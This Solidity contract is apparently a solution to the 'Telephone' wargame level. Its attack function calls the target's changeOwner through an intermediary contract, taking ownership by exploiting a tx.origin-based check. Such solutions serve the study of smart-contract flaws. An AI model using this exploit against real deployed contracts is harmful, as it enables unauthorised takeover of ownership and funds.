// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IInstance {
    function changeOwner(address _owner) external;
}

contract Telephone_Attack{
    address public attackAddress;

    constructor(address _attackAddress) {
        attackAddress = _attackAddress;
    }

    function attack() public {
        IInstance(attackAddress).changeOwner(msg.sender);
    }
}